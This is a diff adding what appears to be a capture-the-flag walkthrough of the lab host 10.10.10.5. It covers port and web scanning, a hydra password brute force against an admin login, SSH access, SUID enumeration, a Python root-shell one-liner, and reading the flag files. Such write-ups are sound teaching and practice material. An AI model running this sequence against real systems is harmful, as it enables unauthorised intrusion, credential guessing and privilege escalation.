@@ -1,0 +1,33 @@
+Starting enumeration of the target machine.
+
+$ nmap -Pn -T4 -p- 10.10.10.5
+$ nmap -sV -sC -p 22,80,3306 10.10.10.5
+
+Found port 80 open with Apache. Let's check for web vulnerabilities.
+
+$ gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt
+$ nikto -h http://10.10.10.5
+
+Discovered /admin login page. Trying default credentials first, then brute force.
+
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form "/admin/login:username=^USER^&password=^PASS^:Invalid"
+
+Got credentials admin:password123. Logging in via SSH.
+
+$ ssh admin@10.10.10.5
+
+Checking what we have access to.
+
+$ whoami
+$ id
+$ sudo -l
+$ find / -perm -4000 -type f 2>/dev/null
+
+Found SUID binary. Exploiting for root.
+
+$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+Got root! Reading the flag.
+
+$ cat /root/flag.txt
+$ cat /home/user/user.txt
